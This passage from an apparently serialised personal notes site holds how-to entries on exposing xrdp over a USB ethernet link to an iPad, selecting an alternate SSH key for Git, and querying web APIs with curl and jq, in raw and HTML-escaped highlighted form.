style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s/^new_cursors=true$/new_cursors=false/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/xrdp/xrdp.ini&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Allow connections in over usb0.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ufw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; allow&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; on&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 10.55.0.0/29&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.55.0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 3389&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; proto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Enable xrdp.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; enable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; xrdp.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;You should now be able to log in using RDP. Standard resolutions work well, but HiDPI/Retina is only marginally more responsive than a slideshow.&lt;/p&gt;\n&lt;p&gt;As with the dropbear configuration in the previous section, please do &lt;em&gt;not&lt;/em&gt; set up RDP like I’m presenting here if you’re using a device that’s exposed to a larger network, or worse yet the internet as a whole. In the real world, RDP servers should &lt;em&gt;only&lt;/em&gt; be accessible over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt;, a VPN, or some other secure wrapper — never exposed directly as we’re doing here. The reason we can get away with less is (again) because we’re &lt;em&gt;only&lt;/em&gt; exposing RDP over the usb0 interface, and the &lt;em&gt;only&lt;/em&gt; other device that ever lives on that network is the iPad.&lt;/p&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;I use &lt;a href=&quot;https://apps.apple.com/us/app/jump-desktop-rdp-vnc-fluid/id364876095&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Jump Desktop&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; as my RDP client, rather than &lt;a href=&quot;https://apps.apple.com/us/app/remote-desktop-mobile/id714464092&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Microsoft Remote Desktop&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — while Microsoft’s offering is overall nicer, Jump Desktop is faster and will connect even when the iPad’s &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; is disconnected (Microsoft will refuse to connect if &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; is disabled, even though the Pi is accessible via USB ethernet!).&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Use-an-alternate-SSH-key-with-Git":{"slug":"spells/Use-an-alternate-SSH-key-with-Git","filePath":"spells/Use an alternate SSH key with Git.md","title":"Use an alternate SSH key with Git","links":["spells/SSH"],"tags":["HowTo","Application/SSH","Application/Git","Application/GPG","Application/KeePassXC"],"content":"By default, Git only uses you primary SSH key when cloning. While there’s no way to get git to try alternate keys if the first key fails, there are a few ways you can force it to use a particular key on a per-repository basis.\nVia ssh-agent\nssh-agent bash -c &quot;ssh-add $KEY_FILE &amp;&amp; git $COMMAND&quot;\n\n\n                  \n                  Important\n                  \n                \n\n\n$KEY_FILE must be the full path of a private key (e.g., ~/.ssh/id_rsa or ~/.ssh/gpg_auth_key.pub).\n\n\n\nThis is useful for running multiple, one-off commands. Note that this method won’t work when used with GPG authentication subkeys.\nVia GIT_SSH_COMMAND\nWith a secret SSH key:\nGIT_SSH_COMMAND=&quot;ssh -i $KEY_FILE -F /dev/null -o IdentityAgent=none&quot; git $COMMAND\n\n\n                  \n                  Important\n                  \n                \n\n\n$KEY_FILE must be the full path of a private key (e.g., ~/.ssh/id_rsa or ~/.ssh/gpg_auth_key.pub).\n\n\n\n\n\n                  \n                  Important\n                  \n                \n\n\nIf you’re running ssh-agent, then setting the config directive IdentityAgent=none is important as otherwise the key(s) already stored in the agent will take precedence over $KEY_FILE.\n\n\n\nWith KeePassXC or a GPG authentication subkey referenced using a public $KEY_FILE, setting IdentityAgent=none is unnecessary:\nGIT_SSH_COMMAND=&quot;ssh -i $KEY_FILE -F /dev/null&quot; git $COMMAND\nVia a config directive\nWith a secret SSH key:\ngit config core.sshCommand &quot;ssh -i $PUBLIC_KEY_FILE -F /dev/null -o IdentityAgent=none&quot;\n\n\n                  \n                  Important\n                  \n                \n\n\n$KEY_FILE must be the full path of a private key (e.g., ~/.ssh/id_rsa or ~/.ssh/gpg_auth_key.pub).\n\n\n\n\n\n                  \n                  Important\n                  \n                \n\n\nIf you’re running ssh-agent, then setting the config directive IdentityAgent=none is important as otherwise the key(s) already stored in the agent will take precedence over $KEY_FILE.\n\n\n\nWith KeePassXC or a GPG authentication subkey referenced using a public $KEY_FILE, setting IdentityAgent=none is unnecessary:\ngit config core.sshCommand &quot;ssh -i $PUBLIC_KEY_FILE -F /dev/null&quot;\nThis is useful for ongoing work, but only works on existing repositories.","richContent":"&lt;p&gt;By default, Git only uses you primary &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key when cloning. While there’s no way to get git to try alternate keys if the first key fails, there are a few ways you can force it to use a particular key on a per-repository basis.&lt;/p&gt;\n&lt;h2 id=&quot;via-ssh-agent&quot;&gt;Via ssh-agent&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#via-ssh-agent&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh-agent&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ssh-add $KEY_FILE &amp;#x26;&amp;#x26; git $COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;code&gt;$KEY_FILE&lt;/code&gt; must be the full path of a private key (e.g., &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt; or &lt;code&gt;~/.ssh/gpg_auth_key.pub&lt;/code&gt;).&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;This is useful for running multiple, one-off commands. Note that this method won’t work when used with GPG authentication subkeys.&lt;/p&gt;\n&lt;h2 id=&quot;via-git_ssh_command&quot;&gt;Via &lt;code&gt;GIT_SSH_COMMAND&lt;/code&gt;&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#via-git_ssh_command&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;With a secret &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;GIT_SSH_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ssh -i $KEY_FILE -F /dev/null -o IdentityAgent=none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $COMMAND&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;code&gt;$KEY_FILE&lt;/code&gt; must be the full path of a private key (e.g., &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt; or &lt;code&gt;~/.ssh/gpg_auth_key.pub&lt;/code&gt;).&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;If you’re running ssh-agent, then setting the config directive &lt;code&gt;IdentityAgent=none&lt;/code&gt; is important as otherwise the key(s) already stored in the agent will take precedence over &lt;code&gt;$KEY_FILE&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;With KeePassXC or a GPG authentication subkey referenced using a public &lt;code&gt;$KEY_FILE&lt;/code&gt;, setting &lt;code&gt;IdentityAgent=none&lt;/code&gt; is unnecessary:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;GIT_SSH_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ssh -i $KEY_FILE -F /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $COMMAND&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;via-a-config-directive&quot;&gt;Via a config directive&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#via-a-config-directive&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;With a secret &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; key:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; core.sshCommand&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ssh -i $PUBLIC_KEY_FILE -F /dev/null -o IdentityAgent=none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;code&gt;$KEY_FILE&lt;/code&gt; must be the full path of a private key (e.g., &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt; or &lt;code&gt;~/.ssh/gpg_auth_key.pub&lt;/code&gt;).&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;If you’re running ssh-agent, then setting the config directive &lt;code&gt;IdentityAgent=none&lt;/code&gt; is important as otherwise the key(s) already stored in the agent will take precedence over &lt;code&gt;$KEY_FILE&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;With KeePassXC or a GPG authentication subkey referenced using a public &lt;code&gt;$KEY_FILE&lt;/code&gt;, setting &lt;code&gt;IdentityAgent=none&lt;/code&gt; is unnecessary:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;git&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; config&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; core.sshCommand&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ssh -i $PUBLIC_KEY_FILE -F /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This is useful for ongoing work, but only works on existing repositories.&lt;/p&gt;"},"spells/Use-curl-and-jq-with-web-APIs":{"slug":"spells/Use-curl-and-jq-with-web-APIs","filePath":"spells/Use curl and jq with web APIs.md","title":"Use curl and jq with web APIs","links":[],"tags":["Application/curl","Application/jq","HowTo"],"content":"You can query web APIs easily with curl. If the API endpoint accepts GET requests, then this is as simple as:\ncurl &quot;web.site/\n(The quotes are important here so that your shell doesn’t interpret &amp; as a request to background curl!)\nFor APIs that use GET/POST/PUT/etc. request types, combine the --data and --request parameters:\ncurl --request POST \\\n     --data &quot;parameter1=value1&amp;parameter2=value2&quot; \\\n            &quot;web.site/&quot;\nThe --data parameter can also be specified multiple times (mostly for readability), in which case you’d normally want to have a single parameter/value pair for each instance.\ncurl --request POST \\\n     --data &quot;parameter1=value1&quot; \\\n     --data &quot;parameter2=value2&quot; \\\n            &quot;web.site/&quot;\nBy default, curl sends data with the Content-Type: application/x-www-form-urlencoded. If you need to change the content type (for example, you frequently need to send Content-Type: application/json with JSON data) or need to specify additional headers (frequently for authentication), then you can use the --header parameter.\ncurl --request POST \\\n     --header &quot;User-Token: XXXXXX&quot; \\\n     --data &quot;parameter1=value1&quot; \\\n     --data &quot;parameter2=value2&quot; \\\n            &quot;web.site/&quot;\nLike --data, the --header parameter can be specified multiple times for multiple headers, and will smartly override curl’s defaults.\ncurl --request POST \\\n     --header &quot;User-Token: XXXXXX&quot; \\\n     --header &quot;Username: My User&quot; \\\n     --data &quot;parameter1=value1&quot; \\\n     --data &quot;parameter2=value2&quot; \\\n            &quot;web.site/&quot;\nBecause responses are often served up in a compact fashion, they’re often a bit hard to read. The jq command’s default filter (.) just pretty-prints (and colorizes!) JSON, which can make interpreting the API’s response much easier.\ncurl --request POST \\\n     --header &quot;User-Token: XXXXXX&quot; \\\n     --header &quot;Username: My User&quot; \\\n     --data &quot;parameter1=value1&quot; \\\n     --data &quot;parameter2=value2&quot; \\\n            &quot;web.site/&quot; | jq .","richContent":"&lt;p&gt;You can query web APIs easily with curl. If the API endpoint accepts GET requests, then this is as simple as:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://web.site/?parameter1=value1&amp;#x26;parameter2=value2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(The quotes are important here so that your shell doesn’t interpret &lt;code&gt;&amp;#x26;&lt;/code&gt; as a request to background curl!)&lt;/p&gt;\n&lt;p&gt;For APIs that use GET/POST/PUT/etc. request types, combine the &lt;code&gt;--data&lt;/code&gt; and &lt;code&gt;--request&lt;/code&gt; parameters:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --request&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter1=value1&amp;#x26;parameter2=value2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;            &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://web.site/&lt;/span&gt;&lt;span 